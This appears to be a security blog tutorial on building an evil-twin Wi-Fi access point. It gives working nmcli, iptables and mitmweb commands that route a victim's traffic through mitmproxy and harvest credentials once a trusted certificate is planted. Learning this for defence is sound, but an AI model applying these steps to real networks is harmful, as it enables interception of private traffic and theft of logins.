---
title: Evil twin attack
author: hugo
date: 2023-09-13 16:19:00 +0200
categories: [Tutorial, security]
tags: [hacking, networking, MiM, mitmproxy, AP, linux]
render_with_liquid: false
---


> This tutorial will guide you through the process of compromising a computer in your LAN. The author gives this example for educational purposes and does not incentivise you to apply these techniques without prior consent
{: .prompt-info }


Can you think of a more dreadful business as weapons manufacturers? I would expect there to be some consensus on this in 2023 as well as some oversight and rules to whom you could sell and not sell to right? You wouldn’t want to help dictators and other bigwigs oppress minorities and dissidents. You would be surprised to know that not everyone agrees with this point of view of course. Check out this exclusive interview of an entrepreneur based in Greece that tells you exactly what he thinks of weaponized software and morality. It’s quite ironic to find a company violating people’s right to privacy in what is known as the birthplace of democracy. On the video below Tal Dilio was interviewed by Forbes and shows how easy it is to hijack someone’s phone. For a mere 9 million dollars you can buy this fully equipped van to spy on anyone within 500 meters and bypass whatsapp encryption.

<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">
<iframe width="100%" height="400px" src="https://minio-api.thekor.eu/chirpy-videos-f1492f08-f236-4a55-afb7-70ded209cb28/chirpy/A-Multimillionaire-Forbes.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>


He conveniently set up his company in a country that wouldn’t interfere with his business and sold weaponised software to hack into people’s phones. According to Lighthouse Reports and Citizen Lab, Dilio sold his products to Rapid Support Forces which is the government’s militia in Sudan. If you research them for less than a minute on wikipedia you can see how friendly these guys are. They killed 100 protestors, injured 500, raped women and pillaged homes in the Khartoum massacre on June 3rd 2019.

Gummo, one the most successful penetration tester that I know of and billionaire bitcoin miner from Florida, sums it up perfectly himself:

> “Everyone should know that your smartphone is a PC and the things that smartphones are capable of doing are terrifying. There was just recently an exploit that I had used for years for iOS that allowed me to actually listen in on your phone conversations, to read your SMS messages, to read your email, to actually see everything that you do on your iOS device. And those sort of exploits exist everywhere in everything. Almost everything has a GPS chip in it. And if it has a chip in it, it can be exploited. And when things are exploited, sometimes devices, things, systems, and people are exploited for one reason or another. There are people selling your information, they are selling your WiFi network, they're selling your WiFi credentials, they're selling your ancestry.com genealogy data. The thing that people don't really understand is that there really is no more privacy in this world unless you go and live on an island somewhere in the South Pacific with no electricity and no other people.”

You can watch the whole episode [on youtube here](https://www.youtube.com/watch?v=g6igTJXcqvo)

These videos and reports fascinated me to the point I had to know how these technologies work. I feel much more secure nowadays knowing how attackers used spear phishing emails to compromise the winter olympics in Korea in 2018 or how linkedin got hacked in 2012. But how did Tal Dilio manage to hijack people’s phones? It doesn't look like he's using a spam campaign to hijack his victims. That remains a mystery to me just like the Pegasus hack from the NSO group. Did they redirect the traffic into an “evil twin” type of broadband network? Let’s dive a little deeper and see how we could replicate such an attack ourselves.  

## Requirements

The first thing we need to conduct an evil twin attack is to get a wireless adapter that supports the "AP" mode which stands for "Access point". My rapsberry pi 3 has this functionality by default which you can test by running the following command:

```console
    waz@localhost:$ iw list
    Wiphy phy8
	max # scan SSIDs: 4
	max scan IEs length: 2287 bytes
	max # sched scan SSIDs: 0
	max # match sets: 0
	RTS threshold: 2346
	Retry short limit: 7
	Retry long limit: 10
	Coverage class: 0 (up to 0m)
	Device supports RSN-IBSS.
	Supported Ciphers:
		* WEP40 (00-0f-ac:1)
		* WEP104 (00-0f-ac:5)
		* TKIP (00-0f-ac:2)
	Available Antennas: TX 0 RX 1
	Supported interface modes:
		 * IBSS
		 * managed
		 * AP
		 * AP/VLAN
		 * monitor
		 * mesh point
		 * P2P-client
		 * P2P-GO

```

If yours doesn't show AP/VLAN and AP under the "Supported interface modes" then you're out of luck. I would recommend buying this [adapter](https://www.amazon.de/Alfa-Network-AWUS036NHA-u-Mount-cs-WLAN-Netzwerkadapter/dp/B01D064VMS/ref=sr_1_1?__mk_de_DE=%C3%85M%C3%85%C5%BD%C3%95%C3%91&keywords=ALFA+Network+AWUS036NHA&qid=1694617378&sr=8-1) it's inexpensive and it will be useful for intercepting and modifying packets in case you want to test how strong your Wireless network is to brute force. I'll probably make an article about that in the near future.

## Bootstraping an 'evil' access point

Now that we have the access point covered, let's set up our evil twin. This evil twin is basically a deceptive computer that pretends to be a wireless access point. 

Make sure to disable any existing wireless (internal) adapter that might interfere with your evil twin and then run these commands to create an access point: 

```console
    waz@localhost:$ ifconfig wlan0 down
    waz@localhost:$ nmcli d
    waz@localhost:$ nmcli con add type wifi ifname wlan1 mode ap con-name MyHomeWiFI ssid WOSHubWiFi
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless.band bg
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless.channel 1
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless-security.key-mgmt wpa-psk
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless-security.proto rsn
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless-security.group ccmp
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless-security.pairwise ccmp
    waz@localhost:$ nmcli con modify MyHomeWiFI 802-11-wireless-security.psk MaxPass21
    waz@localhost:$ nmcli con modify MyHomeWiFI ipv4.method shared
    waz@localhost:$ nmcli con up MyHomeWiFI
```

The network interface that I want to disable is called wlan0 in my example above but you should verify first what the name is on your system by running the command "ifconfig". You should also do the same for wlan1 since I don't know what name it will have on your system. 

At this point you should be able to connect to the internet via this newly created access point that should appear under the name "WOSHubWiFi". 

## Networking

Now that your target machine thinks it's connected to a router let's install another key component to the server acting as an access point: mitmproxy. "Mitm" stands for man in the middle and is an attack that we already covered previously [here](https://chirpy.thekor.eu/posts/man-in-the-middle-attack/). If I had to quickly summarize this previous article I would say I used ARP spoofing to serve my own website that would record credentials. What we'll do here today is in the same vein but it goes a step further by being able to capture data from any website without having to create a fake login page. 
After installing mitmproxy let's now redirect all the traffic going through our evil access point to our mitmproxy by creating the following ip tables rules:

```console
    waz@localhost:$ sysctl -w net.ipv4.ip_forward=1
    waz@localhost:$ iptables -F
    waz@localhost:$ iptables -A INPUT -p tcp --dport 22 -j ACCEPT
    waz@localhost:$ iptables -A INPUT -p tcp --dport 80 -j ACCEPT
    waz@localhost:$ iptables -A INPUT -p tcp --dport 443 -j ACCEPT
    waz@localhost:$ iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080
    waz@localhost:$ iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8080
    waz@localhost:$ iptables -t nat -A PREROUTING -i wlxd03745917ba3 -p tcp --dport 80 -j REDIRECT --to-port 8080
    waz@localhost:$ iptables -t nat -A PREROUTING -i wlxd03745917ba3 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

These configurations are applied on the fly and you won't need to restart your server for them to apply. If you try to use the internet on your target machine you should not be able to which is a good news. It means that the traffic is getting properly redirected to port 8080.

We can fix this internet issue by simply starting the mitmproxy with the following command:

```console
    waz@localhost:$ mitmweb --web-open-browser --web-port 8090 --web-host 192.168.178.93
```
This command starts up a server on port 8080 with a GUI interface on port 8090 of your localhost or any IP you want. I chose 192.168.178.93 in this example which is the access point's local IP address. If you have a web browser open already a new tab should appear with the GUI.

## Encryption

The traffic that we want to read is encrypted with a TLS so the next step is to download the certificate on your target machine by visiting http://mitm.it and placing the file in the right directory of the target computer. If your target is a desktop you actually need to add the certificate into chrome or firefox as well under chrome://settings/security > Manage device certificates> Authorities > Import

![chrome settings](/assets/img/posts/Screenshot from 2023-09-13 17-49-24.png){: width="100%"}

## Listen in on the traffic

Browse all the requests on your GUI app and apply filter or intercept rules to the incoming data. Whenever the client enters his credentials they will appear on your console. 

Just like in our previous showcases I like to complement the code with a use case. I should have probably edited the video to make it shorter but I'm too lazy for that. Here you go:


<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">
<iframe width="100%" height="400px" src="https://minio-api.thekor.eu/chirpy-videos-f1492f08-f236-4a55-afb7-70ded209cb28/chirpy/evil%20twin.mp4
" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>

Thanks for reading this far

See you in the next one